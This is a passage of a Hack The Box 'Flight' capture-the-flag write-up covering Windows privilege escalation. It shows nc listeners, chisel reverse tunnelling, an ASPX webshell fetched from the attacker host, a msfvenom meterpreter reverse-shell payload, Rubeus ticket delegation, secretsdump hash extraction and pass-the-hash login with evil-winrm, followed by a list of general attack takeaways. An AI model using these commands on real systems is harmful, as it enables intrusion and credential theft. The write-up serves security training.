┌──(kali㉿kali)-[~/CTF/HTB/flight/exploit]
└─$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [10.10.14.24] from (UNKNOWN) [10.129.228.120] 58123
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

whoami /all

USER INFORMATION
----------------

User Name    SID                                           
============ ==============================================
flight\c.bum S-1-5-21-4078382237-1492182817-2568127209-1607


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes                                        
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Group used for deny only                          
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
flight\WebDevs                             Group            S-1-5-21-4078382237-1492182817-2568127209-1614 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                                                      


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.


```
We then execute our payload via `RunasCs.exe` providing our user's credentials and we successfully get a call back to our attack machine with a successful reverse shell as `c.bum`. We also note that he is part of the `WebDevs` group in AD. This may mean he has special write privileges concerning sites on this server.

## Privilege Escalation
### Internal Web Server Compromise
```zsh
PS C:\inetpub> dir
dir


    Directory: C:\inetpub


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        9/22/2022  12:24 PM                custerr                                                               
d-----       10/29/2026   9:12 PM                development                                                           
d-----        9/22/2022   1:08 PM                history                                                               
d-----        9/22/2022  12:32 PM                logs                                                                  
d-----        9/22/2022  12:24 PM                temp                                                                  
d-----        9/22/2022  12:28 PM                wwwroot 

dir wwwroot


    Directory: C:\inetpub\wwwroot


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        9/22/2022  12:28 PM                aspnet_client                                                         
-a----        9/22/2022  12:24 PM            703 iisstart.htm                                                          
-a----        9/22/2022  12:24 PM          99710 iisstart.pn

PS C:\inetpub\development> dir
dir


    Directory: C:\inetpub\development


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       10/29/2026   9:12 PM                css                                                                   
d-----       10/29/2026   9:12 PM                fonts                                                                 
d-----       10/29/2026   9:12 PM                img                                                                   
d-----       10/29/2026   9:12 PM                js                                                                    
-a----        4/16/2018   2:23 PM           9371 contact.html                                                          
-a----        4/16/2018   2:23 PM          45949 index.html

```
Poking around the filesystem we find what appears to be site files for yet another site on the server. This one appears to be an IIS server.

```zsh
C:\inetpub>netstat -ano | findstr "LISTENING"
netstat -ano | findstr "LISTENING"
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       5044
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       912
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       5044
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       912
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2932
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       496
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1180
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1652
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       652
  TCP    0.0.0.0:49678          0.0.0.0:0              LISTENING       632

```
We can see there seems to be a service running on port 8000 as well.

```zsh

C:\inetpub\wwwroot>curl http://localhost:8000
curl http://localhost:8000
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<!--

Template 2093 Flight

http://www.tooplate.com/view/2093-flight

-->
    	<title>Flight - Travel and Tour</title>
    
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="apple-touch-icon" href="apple-touch-icon.png">

        <link rel="stylesheet" href="css/bootstrap.min.css">
        <link rel="stylesheet" href="css/bootstrap-theme.min.css">
        <link rel="stylesheet" href="css/fontAwesome.css">
        <link rel="stylesheet" href="css/hero-slider.css">
        <link rel="stylesheet" href="css/owl-carousel.css">
        <link rel="stylesheet" href="css/datepicker.css">
        <link rel="stylesheet" href="css/tooplate-style.css">

        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800" rel="stylesheet">

        <script src="js/vendor/modernizr-2.8.3-respond-1.4.2.min.js"></script>
    </head>

<body>

    
    <section class="banner" id="top">
        <div class="container">
            <div class="row">
                <div class="col-md-5">
                    <div class="left-side">
                        <div class="logo">
                            <img src="img/logo.png" alt="Flight Template">
                        </div>
                        <div class="tabs-content">
                            <h4>Choose Your Direction:</h4>
                            <ul class="social-links">
                                <li><a href="http://facebook.com">Find us on <em>Facebook</em><i class="fa fa-facebook"></i></a></li>
                                <li><a href="http://youtube.com">Our <em>YouTube</em> Channel<i class="fa fa-youtube"></i></a></li>
                                <li><a href="http://instagram.com">Follow our <em>instagram</em><i class="fa fa-instagram"></i></a></li>
                            </ul>
                        </div>
```
Running `cURL` against the port we do, in fact, get a site response back. Let's tunnel this port over to our attack machine with `chisel`.

#### Tunneling
```zsh
┌──(kali㉿kali)-[~/…/HTB/flight/exploit/postcomp]
└─$ chisel server --reverse --port 8001
2026/10/29 16:56:07 server: Reverse tunnelling enabled
2026/10/29 16:56:07 server: Fingerprint cwVKbsYMtr+kpS0I+qC9+rObXBWVd23jpGVbnlmvJP4=
2026/10/29 16:56:07 server: Listening on http://0.0.0.0:8001
```
First we spin up a chisel reverse tunnel server on our machine on port 8001.

```zsh
PS C:\Users\C.Bum> ./chisel.exe client 10.10.14.24:8001 R:8000:127.0.0.1:8000
./chisel.exe client 10.10.14.24:8001 R:8000:127.0.0.1:8000
2026/10/29 20:58:36 client: Connecting to ws://10.10.14.24:8001
2026/10/29 20:58:37 client: Connected (Latency 86.8097ms)

2026/10/29 16:58:35 server: session#8: Client version (1.12.0) differs from server version (1.12.1-0kali2)
2026/10/29 16:58:35 server: session#8: Open (user=- addr=10.129.228.120:51233 remotes=R:0.0.0.0:8000:127.0.0.1:8000)
2026/10/29 16:58:35 server: session#8: tun: proxy#R:8000=>8000: Listening

```
We then upload `chisel.exe` via a python http server on our machine and call it providing our attacker IP, server port, which port on our machine we want to connect it to, and the ports we want forwarded to our machine.

![Pasted image 20261029140244.png](/img/user/CTFs/HTB/Images/Flight%20Images/Pasted%20image%2020261029140244.png)
As you can see we are met with another Flight booking site now accessible on our local machine on port 8000.

![Pasted image 20261029140337.png](/img/user/CTFs/HTB/Images/Flight%20Images/Pasted%20image%2020261029140337.png)
Taking a look inside wappalyzer we do confirm that an IIS server is running on this machine and using ASP.NET as it's framework. We may be able to get a shell with an ASPX style webshell payload since our current user 'c.bum' has write access to the `inetpub/development` directory where this site lives. Let's try it out.

#### ASPX Webshell
```zsh
PS C:\inetpub\development> iwr -Uri http://10.10.14.24:8900/nic3r1.aspx -outfile nice.aspx
iwr -Uri http://10.10.14.24:8900/nic3r1.aspx -outfile nice.aspx
PS C:\inetpub\development> dir
dir


    Directory: C:\inetpub\development


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       10/29/2026   9:12 PM                css                                                                   
d-----       10/29/2026   9:12 PM                fonts                                                                 
d-----       10/29/2026   9:12 PM                img                                                                   
d-----       10/29/2026   9:12 PM                js                                                                    
-a----        4/16/2018   2:23 PM           9371 contact.html                                                          
-a----        4/16/2018   2:23 PM          45949 index.html                                                            
-a----       10/29/2026   9:15 PM           2760 nice.aspx                                                             


PS C:\inetpub\development>
```
First step is to upload our [nic3r](https://github.com/Y3llowDuck/nic3r) webshell to the server inside the `development` subdirectory via python http server from our attack machine. 


![Pasted image 20261029142627.png](/img/user/CTFs/HTB/Images/Flight%20Images/Pasted%20image%2020261029142627.png)
Once complete we navigate to it in the browser of our attack machine and voila. We have a webshell. Now, let's get our webshell to execute yet another reverse shell payload so we can get a shell as user `apppool\defaultapppool`.

```zsh
┌──(kali㉿kali)-[~/…/HTB/flight/exploit/postcomp]
└─$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.24 LPORT=8899 -a x64 -f exe --platform windows -o asp.exe
No encoder specified, outputting raw payload
Payload size: 255675 bytes
Final size of exe file: 262656 bytes
Saved as: asp.exe

PS C:\inetpub\development\development\fonts> cp /Users/C.Bum/asp.exe  
cp /Users/C.Bum/asp.exe
PS C:\inetpub\development\development\fonts> dir
dir


    Directory: C:\inetpub\development\development\fonts


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       10/29/2026   9:31 PM         262656 asp.exe                                                               
-a----        5/26/2017   5:53 AM         165742 fontawesome-webfont.eot                                               
-a----        5/26/2017   5:53 AM         444379 fontawesome-webfont.svg                                               
-a----        5/26/2017   5:53 AM         165548 fontawesome-webfont.ttf                                               
-a----        5/26/2017   5:53 AM          98024 fontawesome-webfont.woff                                              
-a----        5/26/2017   5:53 AM          77160 fontawesome-webfont.woff2                                             
-a----        5/26/2017   5:53 AM         134808 FontAwesome.otf                                                       
-a----        5/29/2017  10:15 PM          20335 glyphicons-halflings-regular.eot                                      
-a----        5/29/2017  10:15 PM          62926 glyphicons-halflings-regular.svg                                      
-a----        5/29/2017  10:15 PM          41280 glyphicons-halflings-regular.ttf                                      
-a----        5/29/2017  10:15 PM          23320 glyphicons-halflings-regular.woff                                     


PS C:\inetpub\development\development\fonts> cp /Users/C.Bum/nic3r1.aspx
cp /Users/C.Bum/nic3r1.aspx

```
We generate another shell executable called `asp.exe` and upload that into the same directory as our webshell.

![Pasted image 20261029144250.png](/img/user/CTFs/HTB/Images/Flight%20Images/Pasted%20image%2020261029144250.png)
We then move to our forwarded port on our attack machine and input the full file path to our `asp.exe` payload.

```zsh
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.24:8899 
[*] Meterpreter session 1 opened (10.10.14.24:8899 -> 10.129.228.120:54364) at 2026-10-29 17:42:06 -0400

meterpreter > sysinfo
Computer        : G0
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : flight
Logged On Users : 17
Meterpreter     : x64/windows
meterpreter > shell
Process 2580 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```
We successfully get our meterpreter shell back to us as user `defaultapppool`. This user is a Microsoft Virtual Account. One thing about these accounts is that when they authenticate over the network, they do so as the machine account. Meaning we should be able to abuse this current session to secrets dump the NTLM hash for `Administrator` via `Rubeus`.

### Post compromise with Rubeus
```zsh
meterpreter > upload postcomp/Rubeus.exe 'C:\Users\Public\Rubeus.exe'
[*] Uploading  : /home/kali/CTF/HTB/flight/exploit/postcomp/Rubeus.exe -> C:\Users\Public\Rubeus.exe
[*] Uploaded 271.50 KiB of 271.50 KiB (100.0%): /home/kali/CTF/HTB/flight/exploit/postcomp/Rubeus.exe -> C:\Users\Public\Rubeus.exe
[*] Completed  : /home/kali/CTF/HTB/flight/exploit/postcomp/Rubeus.exe -> C:\Users\Public\Rubeus.exe
```
first thing we do is upload `Rubeus.exe` to the Public user folder since we have write access there.

```zsh
PS C:\Users\Public> .\Rubeus.exe tgtdeleg /nowrap
.\Rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/g0.flight.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: dg7tY8V87H0f+WI6QyoW4p4ST2QZ9K4W1bmaKF+HLZ4=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIECtGq8E53w4+mDL8Z8W0XgYGiqSEM27PCF/UJiSlwCU2OmAqBkufoJEjwX5GrYwJLFo1mCxkWHGSDYCmJPDFTDewpd3qgfpDfHnMkn+AhbuKV1FIsXa97WFV3SbLqsIAM8+d1omqX+g/AzQI+Fwi6V7AeBxS5bAf7S0CvxVn8NreGOvuDth+/xSZ1VOsCOYmJGU0IvATpWzBBgMR5J0qDPqpmFhtQxFQQlRzIk6Yw3ez+YVGvh16Cc7o+RJVGqNdyUS6zNGdJVjSJzko2imnCYpZU9dpd9UIeViU3UuSxYrwmJbh2srWWl48ohTQPDgY9UwHzRcCzmpuiigrDQB90Q2ZH7ADNCwXoxG5iITMHdqXBrUgGC7xLg10G2hVerYsjWty/FhnzoC/xqnnsqzY/HJy9VjEPSd7f1qTTr4MMeDTQjZuW8koAr7NAyGT4v7CqGZI+1ngA8TtVTZSgcXb1FW4QVhNayeOnDy5NsrVMeOOx0zF76ZaxDIwuVLEStRZjlemYn5u/PeID69xBfi50HBbwh97u9hCxoYt5NiUj9y1zN/H5H62QX+oyml+WiCzjL0faoSUAymPfcevQ3YvcctFNWm2MTdlHnw+r1WsonOCD2yIj23MpTATIXbvrJmad1HApEgz1zhWBcP530llu8VGmbTCzEu1zkteKzx+tCo5PRViHCOIhPbjHEtA+Eua173kxwfaMGivqW3/lez1SR65BVU4uwLwGDbt43t9rlEw5kHfnsvDHxSCl7ZX5q4C8P7UHaSN70J30jo6vChvelwwNOKoU67+RWG34swiOT+5fPpwlyTIC4r0HsiggbjiiOSdRmt0UigId8mZNBTeZ5GTLvranh1bJkrcggEizYgAgIdDDZKE5yw4zOUbbjB8HnMvplN2ArNTtJmm6EN2+VAAeNVQNl4cN7o6bpQXpvw59+jVZJgrNW1K5ucpS38/b9CJJF+PY4Qv4Qop8iSpz7v4IrF8aWCfqRoF0YTjI3gVlxOtiJxNCVQ1DiCaMJkWtAmd8C2GJsBcfDVenWNFPOXpPLodjACQpdu4fo1WDzep4/4DMKczIj7droM1Q1Bvb6rPGf0eoD0kkD3TNQ1Ywrv0GyfEtFy9OTw7BOxWIDCKXcBbXrWJcaBiutS7tG3TJ3kh7m9BtEaFFlT0rSKR8kTh2VCczXUOl3REHL5XuLhd6AYy1U+nHwjuOXxNDCXmowjmhd5w6Mj9/nRKWKaALKuOMsNz7XZaX4XyDtvsRlFcr6RLl1Eb2xktVUe4DTwTaq7GRD2bhR/D7HsgtL9L7ds9CQdIWuXZtcYtnfQP8FtTq6qkKAoYUIk7utW+ij28i2mAxPhgxU/9UNhRa/QAkGF6UGa+CvlVV72K4o4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgwGpweKciw0Rqxc07wr+dwi88GsTiLRzc8wCqjq5VN4OhDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDI2MTAzMDA0NTQzN1qmERgPMjAyNjEwMzAxNDU0MzdapxEYDzIwMjYxMTA2MDQ1NDM3WqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC
```
We then run the executable's `tgtdeleg` mode with the `/nowrap` option so we don't get any weird line breaks in the Kerberos Ticket.

```zsh
┌──(kali㉿kali)-[~/…/HTB/flight/exploit/postcomp]
└─$ minikerberos-kirbi2ccache ticket.kirbi ticket.ccache
INFO:root:Parsing kirbi file /home/kali/CTF/HTB/flight/exploit/postcomp/ticket.kirbi
INFO:root:Done!

```
We then use `minikerberos-kirbi2ccache` to convert the ticket to usable ccache credential file.

```zsh
┌──(kali㉿kali)-[~/…/HTB/flight/exploit/postcomp]
└─$ export KRB5CCNAME=/home/kali/CTF/HTB/flight/exploit/postcomp/ticket.ccache


┌──(kali㉿kali)-[~/…/HTB/flight/exploit/postcomp]
└─$ impacket-secretsdump -k -no-pass G0.flight.htb                                                                     
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Cleaning up..
```
We then export the ccache credential to our `KRB5CCNAME` env variable to use with secretsdump. However, when we call it, it fails stating the SPN target name validation might be restricting full DRSUAPI dumps at the domain level and to attempt to use `-just-dc-user` to dump a local user on the server instead.

```zsh
┌──(kali㉿kali)-[~/…/HTB/flight/exploit/postcomp]
└─$ faketime -f '2026-10-30 01:06:56' impacket-secretsdump -k -no-pass G0.flight.htb -just-dc-user administrator      
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:08c3eb806e4a83cdc660a54970bf3f3043256638aea2b62c317feffb75d89322
Administrator:aes128-cts-hmac-sha1-96:735ebdcaa24aad6bf0dc154fcdcb9465
Administrator:des-cbc-md5:c7754cb5498c2a2f
[*] Cleaning up...
```
Trying again we successfully dump the NTLM hash for the Administrator naming them in the `-just-dc-user` flag and adjusting for clockskew with `faketime`.

### Shell as Administrator

```zsh
┌──(kali㉿kali)-[~/…/HTB/flight/exploit/postcomp]
└─$ evil-winrm -i G0.flight.htb -u 'administrator' -H '43bbfc530bab76141b12c8446e30c17c'
                                        
Evil-WinRM shell v4.1
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Info: Connection successful
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir ../Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/29/2026   8:04 PM             34 root.txt
```
And just like that we successfully gain a shell as the Administrator and find `root.txt` sitting on their Desktop. Pwned.

## Final Thoughts
>[!Takeaways]
>- Whenever you get RFI on a windows machine. See if it will connect back to Responder over SMB to leak a hash.
>- Whenever you have write access to an SMB share use `ntlm_theft` to generate Responder call back files of all different filetypes for testing.
>- If your first uploaded filetype doesn't work (`.lnk` in our case) you should try a different filetype next.
>- Whenever you can't get a shell but have SMB write access to a web directory. Try uploading a shell there and then execute another reverse shell if needed.
>- use `RunasCs` whenever you need to upgrade a reverse shell to a different user. It allows explicit credential use in the command.
>- Chisel tunneling is elite. Use it all the time when forwarding and tunneling.
>- Whenever you encounter an IIS server, you may be able to upload `nic3r` as an ASPX webshell.
>- If you need to dump Kerberos TGT's from a reverse shell, upload `rubeus.exe` to the target.
>- `minikerberos-kirbi2ccache` can convert tickets dumped by Rubeus into usable ccache credential files for use with kerberos auth on your attack machine (i.e. secretsdump, nxc, etc.)
>- If you're using secrets dump with an MS Virtual Account you'll need to use `-just-dc-user` since the account uses the machine account creds to authenticate technically. You won't get Domain secrets with it. 





